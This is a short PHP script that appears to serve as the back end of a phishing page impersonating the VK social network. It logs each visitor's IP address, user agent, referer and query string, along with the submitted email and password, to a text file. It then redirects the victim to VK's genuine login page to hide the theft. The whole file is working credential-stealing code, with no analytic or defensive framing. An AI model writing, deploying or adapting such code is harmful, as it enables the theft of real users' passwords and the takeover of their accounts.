<?php
$log = 'log.txt';
$str = '';
$str .= date('d m Y H.i.s') . '>>';
$str .= $_SERVER['HTTP_REFERER'] . '>>';
$str .= $_SERVER['REMOTE_HOST'] . '>>';
$str .= $_SERVER['REMOTE_ADDR'] . '>>';
$str .= $_SERVER['HTTP_USER_AGENT'] . '>>';
$str .= $_SERVER['QUERY_STRING'] . "\n";
$str .= 'email:' . $_POST['email'] . "\n";
$str .= 'pass:' . $_POST['pass'];
$f = fopen($log, 'a'); 
fputs($f, $str);
fclose($f);
header("Location: https://login.vk.com/?act=login&_origin=https://m.vk.com&ip_h=b88d992d559dfa46c3&lg_h=a6cefa7fbb6b3cf283&role=pda&utf8=1");
die();
?>